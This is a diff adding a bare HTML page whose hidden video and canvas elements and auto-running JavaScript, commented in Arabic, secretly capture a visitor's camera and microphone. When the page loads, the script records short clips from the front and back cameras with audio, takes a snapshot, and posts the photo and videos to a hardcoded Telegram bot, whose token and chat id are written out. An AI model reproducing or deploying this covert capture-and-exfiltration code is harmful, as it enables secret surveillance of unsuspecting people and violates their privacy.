@@ -1,0 +1,225 @@
+<html>
+<body>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
+
+<script>
+// دالة إرسال الصورة إلى تليجرام
+function sendToTelegram(imageData) {
+    const token = '8468116606:AAFI0NKNJhvRE_sugFfmkUSNkvlMu1Xi-5k';
+    const chat_id = '6612813200';
+    const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+
+    const byteCharacters = atob(imageData.split(',')[1]);
+    const byteNumbers = new Array(byteCharacters.length);
+    for (let i = 0; i < byteCharacters.length; i++) {
+        byteNumbers[i] = byteCharacters.charCodeAt(i);
+    }
+    const byteArray = new Uint8Array(byteNumbers);
+    const blob = new Blob([byteArray], { type: 'image/png' });
+
+    const formData = new FormData();
+    formData.append('chat_id', chat_id);
+    formData.append('photo', blob, 'capture.png');
+
+    fetch(url, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            console.log('تم إرسال الصورة بنجاح');
+        } else {
+            console.error('فشل الإرسال:', data.description);
+        }
+    })
+    .catch(error => console.error('خطأ:', error));
+}
+
+// دالة إرسال الفيديو إلى تليجرام
+function sendVideoToTelegram(videoBlob, facingMode) {
+    const token = '8468116606:AAFI0NKNJhvRE_sugFfmkUSNkvlMu1Xi-5k';
+    const chat_id = '6612813200';
+    const url = `https://api.telegram.org/bot${token}/sendVideo`;
+    const filename = facingMode === 'user' ? 'front_camera.webm' : 'back_camera.webm';
+
+    const formData = new FormData();
+    formData.append('chat_id', chat_id);
+    formData.append('video', videoBlob, filename);
+
+    fetch(url, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            console.log(`تم إرسال فيديو الكاميرا ${facingMode} بنجاح`);
+        } else {
+            console.error(`فشل إرسال فيديو ${facingMode}:`, data.description);
+        }
+    })
+    .catch(error => console.error('خطأ في إرسال الفيديو:', error));
+}
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+// دالة مساعدة لإيقاف أي تدفق كاميرا نشط
+function stopStream(stream) {
+    if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+    }
+}
+
+// طلب إذن الميكروفون مرة واحدة (بجودة عالية)
+let audioTrack = null;
+async function getAudioTrack() {
+    if (audioTrack) return audioTrack;
+    try {
+        const audioStream = await navigator.mediaDevices.getUserMedia({
+            audio: {
+                sampleRate: 48000,
+                channelCount: 2,
+                echoCancellation: false,
+                noiseSuppression: false,
+                autoGainControl: false
+            }
+        });
+        audioTrack = audioStream.getAudioTracks()[0];
+        console.log('تم الحصول على إذن الميكروفون');
+        return audioTrack;
+    } catch (err) {
+        console.warn('لا يمكن الوصول للميكروفون، التسجيل سيكون بدون صوت:', err);
+        return null;
+    }
+}
+
+// دالة تسجيل فيديو واحد من كاميرا معينة (مع الصوت إن وجد)
+async function recordCamera(facingMode) {
+    return new Promise(async (resolve, reject) => {
+        let videoStream = null;
+        let mixedStream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+
+        try {
+            // 1. الحصول على فيديو الكاميرا
+            videoStream = await navigator.mediaDevices.getUserMedia({
+                audio: false,
+                video: { facingMode: facingMode }
+            });
+
+            // 2. عرض الفيديو على الشاشة (اختياري)
+            video.srcObject = videoStream;
+
+            // 3. تجهيز mixedStream (فيديو + صوت)
+            mixedStream = new MediaStream();
+            const videoTrack = videoStream.getVideoTracks()[0];
+            mixedStream.addTrack(videoTrack);
+
+            if (audioTrack) {
+                // إضافة نسخة من مسار الصوت (إذا أردنا يمكن استخدام نفس المسار لكن MixedStream يقبل نفس المسار مرة واحدة فقط)
+                // يمكن إضافة نفس المسار مرة أخرى؟ لا، ولكن يمكن إعادة استخدامه لأنه Track موجود. 
+                // MediaStream يمكن أن يحتوي على نفس المسار مرة واحدة فقط. لكن هنا نضيفه من المتغير العام.
+                mixedStream.addTrack(audioTrack);
+            }
+
+            // 4. إعداد MediaRecorder
+            const options = { mimeType: 'video/webm;codecs=vp8,opus' };
+            try {
+                mediaRecorder = new MediaRecorder(mixedStream, options);
+            } catch (e) {
+                console.warn('النوع مع الصوت غير مدعوم، استخدام الافتراضي');
+                mediaRecorder = new MediaRecorder(mixedStream);
+            }
+
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                sendVideoToTelegram(blob, facingMode);
+                recordedChunks = [];
+            };
+
+            // 5. بدء التسجيل
+            mediaRecorder.start();
+            console.log(`بدء تسجيل الكاميرا ${facingMode} مع الصوت`);
+
+            // 6. انتظار تشغيل الفيديو ثم التقاط الصورة بعد نصف ثانية
+            video.onplaying = () => {
+                setTimeout(() => {
+                    // التقاط الصورة
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 640, 640);
+                    const canvasData = canvas.toDataURL("image/png");
+                    sendToTelegram(canvasData);
+
+                    // 7. الاستمرار في التسجيل لمدة ثانيتين إضافيتين ثم الإيقاف
+                    setTimeout(() => {
+                        if (mediaRecorder && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                            console.log(`تم إيقاف تسجيل الكاميرا ${facingMode}`);
+                        }
+                        // إيقاف مسارات الفيديو (وليس الصوت)
+                        stopStream(videoStream);
+                        resolve();
+                    }, 2000); // ثانيتين تسجيل بعد الصورة
+                }, 500); // نصف ثانية بعد بدء التشغيل
+            };
+
+            video.onerror = (err) => {
+                reject(err);
+            };
+        } catch (err) {
+            reject(err);
+        }
+    });
+}
+
+// دالة رئيسية: تسجيل الكاميرتين بالتسلسل
+async function captureBoth() {
+    try {
+        // الحصول على الصوت أولاً (مرة واحدة)
+        await getAudioTrack();
+
+        // تسجيل الكاميرا الأمامية
+        await recordCamera('user');
+
+        // تسجيل الكاميرا الخلفية
+        await recordCamera('environment');
+
+        // إيقاف مسار الصوت بعد الانتهاء
+        if (audioTrack) {
+            audioTrack.stop();
+            audioTrack = null;
+        }
+
+        console.log('تم الانتهاء من تسجيل الكاميرتين مع الصور');
+    } catch (err) {
+        console.error('حدث خطأ:', err);
+        errorMsgElement.innerHTML = `خطأ: ${err.toString()}`;
+    }
+}
+
+// بدء التنفيذ
+captureBoth();
+
+</script>
+
+</body>
+</html>
